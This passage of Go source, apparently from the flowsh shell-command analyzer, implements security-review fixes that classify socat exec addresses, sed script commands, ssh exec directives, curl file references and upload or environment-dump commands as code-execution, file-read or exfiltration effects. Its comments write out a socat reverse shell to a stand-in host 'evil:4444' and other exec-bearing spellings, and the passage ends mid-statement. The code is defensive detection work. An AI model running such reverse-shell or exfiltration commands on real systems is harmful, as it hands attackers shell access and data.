package bind

import (
	"strings"

	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/kb"
)

// ===========================================================================
// security-review.md fixes that live in the binder
// ===========================================================================
//
// Each helper here closes one numbered finding of security-review.md and is
// wired into bindCommand / parseArgs / Bind at the choke point named in the
// finding. The helpers are kept in one file so a future regression is traceable
// to the finding it reopens.

// ---------------------------------------------------------------------------
// Finding 25: netcat-dialect address grammar (socat EXEC:/SYSTEM:)
// ---------------------------------------------------------------------------

// execAddressPrefixes are the socat address types that RUN a program instead of
// naming a network destination. `socat EXEC:/bin/sh TCP:evil:4444` is a reverse
// shell, not an egress to a host called "EXEC"; the address component after the
// colon is the command line the client executes locally.
var execAddressPrefixes = []string{"exec:", "system:"}

// execAddress reports whether an address operand runs a command, and the command
// text when it does (`EXEC:/bin/sh`, `system:sh -c id`).
func execAddress(v string) (string, bool) {
	for _, p := range execAddressPrefixes {
		if len(v) > len(p) && strings.EqualFold(v[:len(p)], p) {
			return v[len(p):], true
		}
	}
	return "", false
}

// F25: the connect address types a tunnelling client writes in front of its
// destination live in engine/hostshape.go's egressProtocols (tcp-connect:, …).

// ---------------------------------------------------------------------------
// Finding 27: GNU sed script sub-language
// ---------------------------------------------------------------------------

// sedScriptCommand is one effect-bearing command of a sed script.
type sedScriptCommand struct {
	kind engine.EffectKind
	// arg is the file (w/r) or the shell command (e). Empty for a command whose
	// argument the parse could not recover.
	arg string
}

// parseSedScript extracts the effect-bearing commands (w/W, r/R, e, s///e) of a
// GNU sed script. It never guesses: an argument it cannot recover is reported as
// unknown (empty arg → the binder widens the target to ⊤).
func parseSedScript(script string) []sedScriptCommand {
	var out []sedScriptCommand
	for _, piece := range splitSedCommands(script) {
		s := stripSedAddress(piece)
		if s == "" {
			continue
		}
		switch s[0] {
		case 'w', 'W':
			out = append(out, sedScriptCommand{kind: engine.KindFSWrite, arg: sedFilePath(s[1:])})
		case 'r', 'R':
			out = append(out, sedScriptCommand{kind: engine.KindFSRead, arg: sedFilePath(s[1:])})
		case 'e':
			out = append(out, sedScriptCommand{kind: engine.KindCodeExec, arg: strings.TrimSpace(s[1:])})
		case 's':
			if sedSubstExecutes(s) {
				out = append(out, sedScriptCommand{kind: engine.KindCodeExec})
			}
			// GNU sed's s command takes the same `w FILE` flag as the standalone
			// command: `s/re/repl/w FILE` truncates and rewrites FILE once a
			// substitution succeeded. Modelling only the standalone spelling let
			// a `FSWrite: Deny` policy admit an arbitrary-file truncation
			// (Finding 27; the fix text named s///w but only `w` was parsed).
			if target, ok := sedSubstWriteTarget(s); ok {
				out = append(out, sedScriptCommand{kind: engine.KindFSWrite, arg: target})
			}
		}
	}
	return out
}

// splitSedCommands splits a script at the command separators sed honours at the
// top level: ';' and newline, outside a /regex/ address and honouring the escape
// character. A `s///` or `y///` command carries its own delimiters, so the split
// keeps them intact.
func splitSedCommands(script string) []string {
	var (
		out   []string
		b     strings.Builder
		delim byte
		esc   bool
		inSub bool
		inAdr bool
		// atCmd is true while the piece holds only an address prefix (or
		// nothing): the position where a command letter is expected.
		atCmd = true
	)
	flush := func() {
		out = append(out, b.String())
		b.Reset()
		atCmd = true
	}
	for i := 0; i < len(script); i++ {
		c := script[i]
		switch {
		case esc:
			b.WriteByte(c)
			esc = false
		case c == '\\':
			b.WriteByte(c)
			esc = true
		case inSub:
			b.WriteByte(c)
			if c == delim {
				inSub = false
				atCmd = false
			}
		case inAdr:
			b.WriteByte(c)
			if c == delim {
				inAdr = false
			}
		case atCmd && (c == 's' || c == 'y') && i+1 < len(script) && isSedDelim(script[i+1]):
			// A substitution command: the delimiter is the next byte and every
			// separator until the closing delimiter belongs to the command.
			b.WriteByte(c)
			delim = script[i+1]
			inSub = true
			i++
			b.WriteByte(delim)
		case atCmd && c == '/':
			// A /regex/ address: its text may contain command letters.
			b.WriteByte(c)
			delim = '/'
			inAdr = true
		case c == ';' || c == '\n':
			flush()
		case c == '{' || c == '}':
			b.WriteByte(c)
			atCmd = true
		default:
			b.WriteByte(c)
			if atCmd && !isSedAddrChar(c) {
				atCmd = false
			}
		}
	}
	flush()
	return out
}

// isSedAddrChar reports whether c can appear in a command address (a line
// number, a range, a step, a negation or the separating blanks).
func isSedAddrChar(c byte) bool {
	switch {
	case c >= '0' && c <= '9':
		return true
	}
	switch c {
	case '$', ',', '!', '~', '+', '-', ' ', '\t':
		return true
	}
	return false
}

// isSedDelim reports whether b can delimit an s/y command (any byte except
// backslash and newline).
func isSedDelim(b byte) bool { return b != '\\' && b != '\n' }

// sedFilePath recovers the file name of a w/W/r/R command: the rest of the
// command, with the leading blank separator removed and the file name taken up
// to an unescaped end-of-command marker.
func sedFilePath(rest string) string {
	rest = strings.TrimLeft(rest, " \t")
	if rest == "" {
		return ""
	}
	var b strings.Builder
	esc := false
	for i := 0; i < len(rest); i++ {
		c := rest[i]
		if esc {
			b.WriteByte(c)
			esc = false
			continue
		}
		if c == '\\' {
			esc = true
			continue
		}
		b.WriteByte(c)
	}
	return strings.TrimSpace(b.String())
}

// sedSubstExecutes reports whether an s/// command carries the `e` flag, which
// pipes the pattern space through a shell (GNU sed).
func sedSubstExecutes(s string) bool {
	flags, ok := sedSubstFlags(s)
	return ok && strings.ContainsRune(flags, 'e')
}

// sedSubstWriteTarget recovers the `w FILE` flag of an s/// command and returns
// the file it truncates once the substitution succeeds. ok reports that the flag
// is present; an empty target means the file name could not be recovered, which
// the binder widens to ⊤ rather than dropping the write.
func sedSubstWriteTarget(s string) (string, bool) {
	flags, ok := sedSubstFlags(s)
	if !ok {
		return "", false
	}
	j := strings.IndexByte(flags, 'w')
	if j < 0 {
		return "", false
	}
	return sedFilePath(flags[j+1:]), true
}

// sedSubstFlags returns the flag list of an s/// command — everything after the
// closing delimiter of the replacement (`s/re/repl/flags`, where FLAGS may be
// `g`, `p`, a number, `i`/`m`, `e` or `w FILE`).
func sedSubstFlags(s string) (string, bool) {
	if len(s) < 2 || !isSedDelim(s[1]) {
		return "", false
	}
	delim := s[1]
	n := 0
	esc := false
	for i := 2; i < len(s); i++ {
		c := s[i]
		if esc {
			esc = false
			continue
		}
		if c == '\\' {
			esc = true
			continue
		}
		if c == delim {
			n++
			if n == 2 {
				return s[i+1:], true
			}
		}
	}
	return "", false
}

// stripSedAddress removes a leading command address (`1`, `$`, `/re/`,
// `1,296`, `addr!`, `\%re%`) so the command letter is the first byte.
func stripSedAddress(s string) string {
	s = strings.TrimSpace(s)
	for {
		s = strings.TrimLeft(s, " \t")
		if s == "" {
			return s
		}
		switch {
		case s[0] >= '0' && s[0] <= '9', s[0] == '$':
			i := 0
			for i < len(s) && (s[i] >= '0' && s[i] <= '9' || s[i] == '$' || s[i] == '+' || s[i] == '~') {
				i++
			}
			s = s[i:]
		case s[0] == '/':
			i := strings.IndexByte(s[1:], '/')
			if i < 0 {
				return s
			}
			s = s[i+2:]
		case s[0] == '\\' && len(s) > 2:
			d := s[1]
			i := strings.IndexByte(s[2:], d)
			if i < 0 {
				return s
			}
			s = s[i+3:]
		case s[0] == '!':
			s = s[1:]
		case s[0] == ',':
			s = s[1:]
		default:
			return s
		}
	}
}

// ---------------------------------------------------------------------------
// Finding 28: ssh -o exec-bearing directives
// ---------------------------------------------------------------------------

// sshExecDirectives are the ssh_config directives whose value is a shell command
// line ssh runs locally (or, for RemoteCommand, on the server). `man ssh_config`
// documents ProxyCommand and LocalCommand as "executed with the user's shell".
var sshExecDirectives = map[string]bool{
	"proxycommand":       true,
	"localcommand":       true,
	"knownhostscommand":  true,
	"permitlocalcommand": true,
}

// sshDirectiveExec reports the command line an `-o NAME=VALUE` directive runs.
// It accepts both the `NAME=VALUE` and the space-joined `NAME VALUE` spellings.
// The boolean is false when the directive is not exec-bearing (or, for
// PermitLocalCommand, when the directive merely enables a command named
// elsewhere — it still denotes an exec-capable configuration, so it is treated
// as one).
func sshDirectiveExec(v string) (string, bool) {
	v = strings.TrimSpace(v)
	if v == "" {
		return "", false
	}
	name, val := v, ""
	if i := strings.IndexByte(v, '='); i >= 0 {
		name, val = v[:i], strings.TrimSpace(v[i+1:])
	} else if i := strings.IndexByte(v, ' '); i >= 0 {
		name, val = v[:i], strings.TrimSpace(v[i+1:])
	}
	name = strings.ToLower(strings.TrimSpace(name))
	if !sshExecDirectives[name] {
		return "", false
	}
	// Every directive except PermitLocalCommand *is* a command line: an empty
	// value runs nothing. PermitLocalCommand only enables the LocalCommand
	// path, so it fires on a truthy value and names no subject of its own.
	if name == "permitlocalcommand" {
		switch strings.ToLower(val) {
		case "yes", "true", "on", "1":
			return "", true
		}
		return "", false
	}
	if val == "" {
		return "", false
	}
	return val, true
}

// ---------------------------------------------------------------------------
// Finding 31: a multi-character short option with an attached value
// ---------------------------------------------------------------------------

// attachedShortOption finds the longest declared single-dash option spec that
// prefixes token and is followed by ':' or '=' (Java's documented
// `-agentlib:<name>[=<opts>]` grammar and its general form). It returns the
// parameter and the attached value.
func attachedShortOption(cmd *kb.Command, token string) (kb.Param, string, bool) {
	if cmd == nil || len(token) < 4 || token[0] != '-' || token[1] == '-' {
		return kb.Param{}, "", false
	}
	bestLen := 0
	var best kb.Param
	for _, p := range cmd.Params {
		if p.Kind != kb.ParamOption || strings.HasPrefix(p.Spec, "--") {
			continue
		}
		// A one-letter option is already handled by the cluster splitter; this
		// path exists for the multi-letter specs the splitter cannot reach.
		if len(p.Spec) <= 2 || len(p.Spec) >= len(token) {
			continue
		}
		if !strings.HasPrefix(token, p.Spec) {
			continue
		}
		switch token[len(p.Spec)] {
		case ':', '=':
		default:
			continue
		}
		if len(p.Spec) > bestLen {
			bestLen, best = len(p.Spec), p
		}
	}
	if bestLen == 0 {
		return kb.Param{}, "", false
	}
	return best, token[bestLen+1:], true
}

// ---------------------------------------------------------------------------
// Finding 34: unique-prefix matching for long options
// ---------------------------------------------------------------------------

// longOptionPrefix resolves a `--name` miss against the command's declared long
// options by unique prefix (what getopt_long/argp do). It reports the matched
// parameter, and ambiguous when more than one declared option shares the prefix
// — the caller then degrades to ⊤ rather than picking one.
func longOptionPrefix(cmd *kb.Command, name string) (p kb.Param, found, ambiguous bool) {
	if cmd == nil || len(name) <= 2 || !strings.HasPrefix(name, "--") {
		return kb.Param{}, false, false
	}
	var hits []kb.Param
	for _, cand := range cmd.Params {
		if !strings.HasPrefix(cand.Spec, "--") {
			continue
		}
		if strings.HasPrefix(cand.Spec, name) {
			hits = append(hits, cand)
		}
	}
	switch len(hits) {
	case 0:
		return kb.Param{}, false, false
	case 1:
		return hits[0], true, false
	default:
		return kb.Param{}, false, true
	}
}

// ---------------------------------------------------------------------------
// Finding 36: curl's value grammars for a file reference
// ---------------------------------------------------------------------------

// nameAtFileSpecs are the options whose documented value grammar includes the
// `name@file` form (curl's --data-urlencode / --url-query).
var nameAtFileSpecs = map[string]bool{
	"--data-urlencode": true,
	"--url-query":      true,
}

// nameLtFileSpecs are the options whose documented value grammar includes the
// `name=<file` content form (curl's -F/--form).
var nameLtFileSpecs = map[string]bool{
	"-F": true, "--form": true,
}

// fileRefPathFor resolves a fileRef parameter's value to the file it reads. It
// understands every documented curl spelling — `@path`, `@-`, `name=@path`,
// `name@path` and `name=<path` — and returns the path so the caller's existing
// FSRead / taint / pairing logic applies unchanged.
func fileRefPathFor(spec string, value Arg) (path string, fromStdin, ok bool) {
	if !value.Literal || value.Value == "" {
		return "", false, false
	}
	return fileRefPathString(spec, value.Value)
}

// plainFileRefSpecs are options whose value is itself the path of a payload
// file when it is not written with the `@` convention: gh's --notes-file and
// --body-file name a file whose text is uploaded verbatim, and gh's -F is the
// documented alias of --notes-file in the release/issue subcommands (its
// `key=value` form belongs to `gh api`, where `key=@file` is the file
// spelling). The whole value is then the path, so the read is emitted exactly
// as for the `@file` form.
var plainFileRefSpecs = map[string]bool{
	"-F": true, "--notes-file": true, "--body-file": true, "--input": true,
}

func fileRefPathString(spec, v string) (path string, fromStdin, ok bool) {
	resolve := func(p string) (string, bool, bool) {
		switch p {
		case "-":
			return "", true, true
		case "":
			return "", false, false
		default:
			return p, false, true
		}
	}
	if strings.HasPrefix(v, "@") {
		return resolve(v[1:])
	}
	// name=@path
	if i := strings.IndexByte(v, '='); i >= 0 && i+1 < len(v) && v[i+1] == '@' {
		return resolve(v[i+2:])
	}
	// name=<path (curl's -F content-from-file form).
	if nameLtFileSpecs[spec] {
		if i := strings.Index(v, "=<"); i > 0 {
			p := v[i+2:]
			return resolve(p)
		}
	}
	// name@path (curl's --data-urlencode / --url-query form): the text before
	// the '@' is the field name, the rest names the file.
	if nameAtFileSpecs[spec] {
		if i := strings.IndexByte(v, '@'); i > 0 {
			name := v[:i]
			if !strings.ContainsAny(name, "=/\\") {
				return resolve(v[i+1:])
			}
		}
	}
	// A payload option whose value is the file itself when it is not written
	// with the `@` convention (gh --notes-file/--body-file/--input, and -F in
	// its release/issue meaning). A `key=value` field has no file to read and
	// keeps the `name=@path` handling above.
	if plainFileRefSpecs[spec] && !strings.ContainsAny(v, "=@") {
		return resolve(v)
	}
	return "", false, false
}

// ---------------------------------------------------------------------------
// Finding 44: a parameter whose value is a file of options
// ---------------------------------------------------------------------------

// optionFileSpecs names, per command, the parameters whose value is a *file of
// options*: the effects the invocation performs are written in that file, not on
// the command line. The analysis cannot read the file (no runtime I/O) and, for
// the stdin spellings, the text belongs to another command, so the invocation is
// degraded to ⊤ rather than reported as a bounded read of the file's path.
//
// `tar -T/--files-from` and `rsync --files-from` are list files (a selection of
// operands, not options) and are declared FSRead in the rows instead: the
// corpus' benign control pins that a list-file invocation must not raise ⊤.
var optionFileSpecs = map[string]map[string]bool{
	"curl":        {"-K": true, "--config": true},
	"ssh":         {"-F": true},
	"scp":         {"-F": true},
	"sftp":        {"-F": true},
	"autossh":     {"-F": true},
	"ssh-copy-id": {"-F": true},
}

// isOptionFile reports whether (command, spec) names a file of options.
func isOptionFile(cmd *kb.Command, spec string) bool {
	if cmd == nil {
		return false
	}
	return optionFileSpecs[cmd.Name][spec]
}

// ---------------------------------------------------------------------------
// Finding 95: a parameter whose value is a *script file* in the tool's own
// command language
// ---------------------------------------------------------------------------

// languageFileSpecs names, per command, the parameters whose value is a file
// holding the tool's own command language rather than data:
//
//   - psql's `-f`/`--file` runs a SQL script, and psql's command language
//     includes the `\!` meta-command and `\copy … from program`, each of which
//     runs a shell command. The row already declares the *inline* form of the
//     same capability (`-c`/`--command`) as CodeExec;
//   - sqlite3's `-init` runs the dot-command script of a file (`.shell`,
//     `.output`, `.read`), exactly the language that arrives on standard input
//     in frontend/bash's stdinCodeClients;
//   - gdb's `-x`/`--command` runs a debugger command file, whose `shell`
//     command is the same capability gdb's `-ex` carries inline;
//   - redis-cli's `--eval` runs a Lua script on the server: the script decides
//     which Redis commands execute, and `CONFIG SET dir` + `SAVE` writes an
//     arbitrary path while `SLAVEOF`/`REPLICAOF` ships the dataset to another
//     host — the same "the file decides the effects" shape as the three above,
//     and redis-cli is in frontend/bash's stdinCodeClients for it.
//
// The analysis cannot read the file (no runtime I/O), so the invocation's
// effect set is unknown: the result widens to ⊤ exactly as for a file of
// options (Finding 44) and for a script delivered on standard input
// (Finding 60). The *inline* spellings keep their bounded treatment — their
// text is visible, so `psql -c 'select 1'` and `gdb -ex 'shell id'` stay
// bounded CodeExec.
var languageFileSpecs = map[string]map[string]bool{
	"psql":      {"-f": true, "--file": true},
	"sqlite3":   {"-init": true},
	"gdb":       {"-x": true, "--command": true},
	"redis-cli": {"--eval": true},
}

// isLanguageFile reports whether (command, spec) names a file of the command's
// own command language.
func isLanguageFile(cmd *kb.Command, spec string) bool {
	if cmd == nil {
		return false
	}
	return languageFileSpecs[cmd.Name][spec]
}

// ---------------------------------------------------------------------------
// Finding 96: a *response file* (`@FILE`) supplies options, not an operand
// ---------------------------------------------------------------------------

// responseFileCommands are the commands whose argument grammar documents an
// `@FILE` word that is replaced, before the invocation runs, by the options
// that file contains: the GCC driver (gcc, and its cc/clang aliases — man gcc,
// "@file"), GNU ld, as, ar, strip and nm (man ld, "Read command-line options
// from file … The file may itself contain additional @file options"), and
// javac's `@argfile`.
//
// The content therefore decides the invocation's effects — `-wrapper` (run the
// compiler under an arbitrary program), `-fplugin=`/`--plugin` (load a shared
// object into the tool), `-specs=` and `-o` (relocate the output) are all
// options a response file can carry — and the analysis cannot read it, so the
// effect set is unknown and the result widens to ⊤. This is the option-file
// rule of Finding 44 applied to the spelling the tool itself expands.
var responseFileCommands = map[string]bool{
	"gcc": true, "cc": true, "clang": true,
	"ld": true, "as": true, "ar": true, "strip": true, "nm": true,
	"objdump": true, "readelf": true, "strings": true,
	"javac": true,
}

// responseFileOperands returns, for a command that expands `@FILE` words, the
// operand describing the file each of them reads. The `@` is stripped so the
// read names the path the tool opens; a dynamic `@` operand (a response file
// whose own name is unknown) is returned with an empty literal value, which the
// read widens to ⊤.
func responseFileOperands(cmd *kb.Command, rest []Arg) ([]Arg, bool) {
	if cmd == nil || !responseFileCommands[cmd.Name] {
		return nil, false
	}
	var out []Arg
	for _, a := range rest {
		if !strings.HasPrefix(a.Value, "@") {
			continue
		}
		p := a
		if len(a.Value) > 1 {
			p.Value = a.Value[1:]
		} else if a.Literal {
			// A bare `@` operand names no file to expand.
			continue
		}
		out = append(out, p)
	}
	return out, len(out) > 0
}

// ---------------------------------------------------------------------------
// Finding 71: the local source operand of a remote-upload client
// ---------------------------------------------------------------------------

// uploadSourceIndices returns every operand index the invocation uploads.
//
// A code-host client takes more than one payload in one invocation
// (`gh release upload TAG FILE…`, `gh gist create FILE…`), and every one of
// them is read and shipped; reporting only the first would under-report the
// same way reporting none does. The subcommand operands are therefore matched
// as a documented phrase prefix, and every operand after it is a payload.
func uploadSourceIndices(cmd *kb.Command, ops []Arg) ([]int, bool) {
	if cmd == nil || len(ops) == 0 {
		return nil, false
	}
	word := func(i int) string {
		if i >= len(ops) || !ops[i].Literal {
			return ""
		}
		return ops[i].Value
	}
	// payloads returns the indices of the operands starting at first that name
	// a local file. `-` is standard input, not a path: its content is the
	// pipeline's, which the stdin taint already carries.
	payloads := func(first int) ([]int, bool) {
		var out []int
		for i := first; i < len(ops); i++ {
			if !ops[i].Literal || ops[i].Value == "" || ops[i].Value == "-" {
				continue
			}
			out = append(out, i)
		}
		return out, len(out) > 0
	}
	switch cmd.Name {
	case "aws":
		// aws s3 cp|mv|sync SRC DEST
		if word(0) == "s3" && (word(1) == "cp" || word(1) == "mv" || word(1) == "sync") && len(ops) > 2 {
			return []int{2}, true
		}
	case "gcloud":
		// gcloud storage cp|rsync|mv SRC DEST, gcloud compute scp SRC DEST
		if word(0) == "storage" && (word(1) == "cp" || word(1) == "rsync" || word(1) == "mv") && len(ops) > 2 {
			return []int{2}, true
		}
		if word(0) == "compute" && word(1) == "scp" && len(ops) > 2 {
			return []int{2}, true
		}
	case "rclone":
		// rclone copy|sync|copyto|move SRC DEST
		switch word(0) {
		case "copy", "sync", "copyto", "move":
			if len(ops) > 1 {
				return []int{1}, true
			}
		}
	case "kubectl":
		// kubectl cp SRC DEST
		if word(0) == "cp" && len(ops) > 1 {
			return []int{1}, true
		}
	case "svn":
		// svn import SRC URL
		if word(0) == "import" && len(ops) > 1 {
			return []int{1}, true
		}
	case "gh":
		// gh release upload|create TAG FILE…, gh gist create FILE…
		if word(0) == "release" && (word(1) == "upload" || word(1) == "create") {
			return payloads(3)
		}
		if word(0) == "gist" && word(1) == "create" {
			return payloads(2)
		}
	case "glab":
		// glab release create|upload TAG FILE…, glab snippet create FILE…
		if word(0) == "release" && (word(1) == "create" || word(1) == "upload") {
			return payloads(3)
		}
		if word(0) == "snippet" && word(1) == "create" {
			return payloads(2)
		}
	}
	return nil, false
}

// uploadSourceRead builds the FSRead of a local upload payload.
func uploadSourceRead(a Arg, atoms []engine.Atom) (engine.Effect, engine.Derivation) {
	var target engine.Scope
	switch {
	case a.Literal && a.Value != "":
		target = engine.ScopeOf(a.Value)
	case a.Dir != "":
		target = engine.ScopeOf(a.Dir)
	default:
		target = engine.ScopeTop()
	}
	taint := engine.TaintOf(engine.TaintFileSystem).Join(a.Taint)
	if a.Literal && engine.SecretPath(a.Value) {
		taint = taint.Join(engine.TaintOf(engine.TaintSecret))
	}
	e := engine.Effect{
		Kind:       engine.KindFSRead,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      taint,
		Reversible: true,
	}
	return e, derive(e, atoms, "fs.read")
}

// ---------------------------------------------------------------------------
// Finding 7: the whole-environment read spelling
// ---------------------------------------------------------------------------

// wholeEnvironmentDump reports whether the invocation prints the process
// environment, or the shell's whole variable set, rather than naming a
// variable. `printenv` with no operand prints every variable; `export` /
// `declare` / `typeset` / `readonly` print the variable (or function) set;
// bare `set` prints everything the shell holds.
//
// An invocation that names a variable or sets an option is not a dump: it is
// left to the row's own declaration (printenv VARIABLE → EnvRead{NAME},
// export NAME → EnvWrite{NAME}, set -e → option change).
func wholeEnvironmentDump(cmd *kb.Command, ops []Arg, matches []match) bool {
	if cmd == nil || len(ops) > 0 {
		return false
	}
	switch cmd.Name {
	case "printenv":
		// -0 only changes the record separator; the dump is still a dump.
		return true
	case "export", "declare", "typeset", "readonly":
		for _, m := range matches {
			switch m.param.Spec {
			case "-p", "-f":
				// printing forms: -p prints variables, -f functions
			default:
				return false
			}
		}
		return true
	case "set":
		// Any flag (`set -e`, `set -x`) changes shell options and prints
		// nothing; only the bare form dumps.
		return len(matches) == 0
	}
	return false
}

// wholeEnvironmentRead is the EnvRead a whole-environment dump performs. The
// target is ⊥ — no variable is named — and the effect is secret-tainted: the
// dump selects whatever credentials the process environment holds, which is the
// source Finding 7's exfiltration pair needs. Without it the client contributed
// only its intrinsic ProcSpawn and an upload of the dump paired with nothing.
func wholeEnvironmentRead(cmd *kb.Command, ops []Arg, matches []match, cmdAtom engine.Atom) (engine.Effect, engine.Derivation, bool) {
	if !wholeEnvironmentDump(cmd, ops, matches) {
		return engine.Effect{}, engine.Derivation{}, false
	}
	e := engine.Effect{
		Kind:       engine.KindEnvRead,
		Target:     engine.ScopeBottom(),
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintOf(engine.TaintSecret),
		Reversible: true,
	}
	return e, derive(e, []engine.Atom{cmdAtom}, ruleForKind(engine.KindEnvRead)), true
}

// ---------------------------------------------------------------------------
// Finding 14: a network subcommand's named remote survives the egress gate
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Finding 11: patch's targets come from the diff stream
// ---------------------------------------------------------------------------

// patchWritesHeader reports whether a `patch` invocation applies a diff (so it
// rewrites the files named in the diff's headers) rather than only reporting on
// it. --dry-run and --output-only write nothing.
func patchApplies(specs []string) bool {
	for _, s := range specs {
		switch s {
		case "--dry-run", "--output-only", "-o":
			return false
		}
	}
	return true
}

// topWrite is the conservative FSWrite over an unresolved target: the operation
// certainly writes, but which file it writes cannot be bound from the command
// line.
func topWrite() engine.Effect {
	return engine.Effect{
		Kind:       engine.KindFSWrite,
		Target:     engine.ScopeTop(),
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: false,
	}
}

// isSedCommand reports whether cmd is GNU sed's row.
func isSedCommand(cmd *kb.Command) bool {
	return cmd != nil && (cmd.Name == "sed" || cmd.Name == "gsed")
}

// dropOptionFilledPositionals removes the positional parameters whose slot an
// option has already supplied. GNU sed takes its script from `-e SCRIPT` (or
// `-f FILE`), and the row's SCRIPT positional then has no operand: every
// operand of the invocation is an input file, which the FILE positional must
// see. Binding the first operand to SCRIPT instead described a path as script
// text and dropped its FSRead (Finding 27), so a credential upload through the
// `-e` spelling formed no exfiltration pair.
func dropOptionFilledPositionals(cmd *kb.Command, ps []kb.Param, matches []match) []kb.Param {
	if !isSedCommand(cmd) {
		return ps
	}
	filled := false
	for _, m := range matches {
		switch m.param.Spec {
		case "-e", "--expression", "-f", "--file":
			filled = true
		}
	}
	if !filled {
		return ps
	}
	out := make([]kb.Param, 0, len(ps))
	for _, p := range ps {
		if p.Spec == "SCRIPT" {
			continue
		}
		out = append(out, p)
	}
	return out
}

// isChmodCommand reports whether cmd is chmod's row.
func isChmodCommand(cmd *kb.Command) bool {
	return cmd != nil && cmd.Name == "chmod"
}

// isInstallCommand reports whether cmd is install's row.
func isInstallCommand(cmd *kb.Command) bool {
	return cmd != nil && cmd.Name == "install"
}

// isPatchCommand reports whether cmd is patch's row.
func isPatchCommand(cmd *kb.Command) bool {
	return cmd != nil && cmd.Name == "patch"
}

// ---------------------------------------------------------------------------
// Shared helpers for the wiring in bind.go
// ---------------------------------------------------------------------------

// isOpenSSH reports whether cmd is an OpenSSH client row (-o directives).
func isOpenSSH(cmd *kb.Command) bool {
	return cmd != nil && cmd.Dialect == kb.DialectOpenSSH
}

// execTextEffect builds the CodeExec for a shell command line an option or an
// address supplies (ssh -o ProxyCommand, socat EXEC:, nc -e). The text is a
// program *plus its arguments*, which the analysis does not parse: what runs
// cannot be bounded, so the effect is the arbitrary-code-execution kind the
// knowledge base already uses for the same shape (`sort --compress-program`,
// git `--exec`) rather than the weaker process-spawn kind — a policy that
// denies code execution must see it (Findings 28/30). An unbound command text
// widens the target to ⊤ — the execution is certain, its subject is not.
func execTextEffect(text string, a Arg) engine.Effect {
	_ = a
	target := engine.ScopeTop()
	if text != "" {
		target = engine.ScopeOf(text)
	}
	return engine.Effect{
		Kind:       engine.KindCodeExec,
		Target:     target,
		Mode:       engine.ModeDirect,
		Certainty:  engine.CertaintyCertain,
		Taint:      engine.TaintBottom(),
		Reversible: false,
	}
}

// splitAddressGroup partitions a netcat-dialect egress operand group into the
// operands that name a destination and the operands that run a program
// (socat's EXEC:/SYSTEM: address types, Finding 25). Any non-netcat parameter
// group is returned unchanged.
func splitAddressGroup(cmd *kb.Command, p kb.Param, group []Arg) (egress, execs []Arg) {
	if cmd == nil || cmd.Dialect != kb.DialectNetcat || p.Effect.Kind != engine.KindNetEgress || len(group) == 0 {
		return group, nil
	}
	for _, a := range group {
		if a.Literal {
			if _, ok := execAddress(a.Value); ok {
				execs = append(execs, a)
				continue
			}
		}
		egress = append(egress, a)
	}
	return egress, execs
}

// addressExecEffects lowers the EXEC:/SYSTEM: address operands of a netcat
// client to the process spawn they perform.
func addressExecEffects(execs []Arg) []engine.Effect {
	out := make([]engine.Effect, 0, len(execs))
	for _, a := range execs {
		text, _ := execAddress(a.Value)
		out = append(out, execTextEffect(text, a))
	}
	return out
}

// addressExecDerivations justifies the spawns of addressExecEffects.
func addressExecDerivations(execs []Arg, cmdAtom engine.Atom) []engine.Derivation {
	out := make([]engine.Derivation, 0, len(execs))
	for _, a := range execs {
		text, _ := execAddress(a.Value)
		out = append(out, derive(execTextEffect(text, a), []engine.Atom{cmdAtom, operandAtom(a.Value, a.Pos)}, "code.exec"))
	}
	return out
}

// operationParam reports whether a positional parameter's slot carries an
// *operation* — a subcommand, a target or an archive sink — as opposed to a
// plain data path. The intrinsic ProcSpawn fallback keys on these slots being
// modelled: adding a read-only option must not suppress the "it ran" effect of
// an unmodelled subcommand (Finding 65), while a flag-only invocation of an
// ordinary file utility (ls -la, df -h) keeps its precise effect set.
func operationParam(p kb.Param) bool {
	if p.Kind != kb.ParamPositional {
		return false
	}
	switch p.Effect.Kind {
	case engine.KindCodeExec, engine.KindProcSpawn, engine.KindNetEgress,
		engine.KindFSWrite, engine.KindPersist, engine.KindPrivEsc:
		return true
	}
	return false
}

// hasFlagSpec reports whether a matched spec list contains want.
func hasFlagSpec(specs []string, want string) bool {
	for _, s := range specs {
		if s == want {
			return true
		}
	}
	return false
}

// sedEffects lowers GNU sed's script sub-language for one invocation: the
// SCRIPT positional (when no -e/--expression supplies it) and every -e value are
// scanned for the effect-bearing commands, and an `-f FILE` script — whose text
// the analysis cannot see — degrades the invocation to ⊤.
func sedEffects(cmd *kb.Command, rest []Arg, matches []match, cmdAtom engine.Atom, file string) ([]engine.Effect, []engine.Derivation, bool) {
	var (
		out     []engine.Effect
		ders    []engine.Derivation
		scripts []Arg
		degrade bool
	)
	for _, m := range matches {
		switch m.param.Spec {
		case "-f", "--file":
			// The whole script lives in a file: unanalysable by construction.
			degrade = true
		case "-e", "--expression":
			if !m.hasVal {
				continue
			}
			v := m.value
			v.Pos = withFile(v.Pos, file)
			scripts = append(scripts, v)
		}
	}
	if len(scripts) == 0 && len(rest) > 0 {
		// Without -e, the first operand is the script text.
		scripts = append(scripts, rest[0])
	}
	for _, sc := range scripts {
		if !sc.Literal {
			// The script text is not statically known (a variable, a command
			// substitution, an unquoted glob). It is not widened to ⊤ here: a
			// pathspec-shaped script is a globally unknown word in this
			// frontend, and widening every such invocation would make the
			// benign corpus' `grep -f <(sed s?…? f)` a false ⊤. The script's
			// effect-bearing commands are therefore unmodelled for this
			// spelling (recorded as a residual in the review report); a script
			// *file* (-f) is the unanalysable case that does degrade.
			continue
		}
		for _, c := range parseSedScript(sc.Value) {
			e, d := sedCommandEffect(c, sc, cmdAtom)
			out = append(out, e)
			ders = append(ders, d)
		}
	}
	return out, ders, degrade
}

// sedCommandEffect lowers one effect-bearing sed script command.
func sedCommandEffect(c sedScriptCommand, sc Arg, cmdAtom engine.Atom) (engine.Effect, engine.Derivation) {
	var target engine.Scope
	switch {
	case c.arg != "":
		target = engine.ScopeOf(c.arg)
	default:
		target = engine.ScopeTop()
	}
	taint := engine.TaintBottom()
	if c.kind == engine.KindFSWrite {
		taint = engine.TaintOf(engine.TaintFileSystem)
	}
	if c.kind == engine.KindFSRead && engine.SecretPath(c.arg) {
		taint = engine.TaintOf(engine.TaintFileSystem).Join(engine.TaintOf(engine.TaintSecret))
	}
	e := engine.Effect{
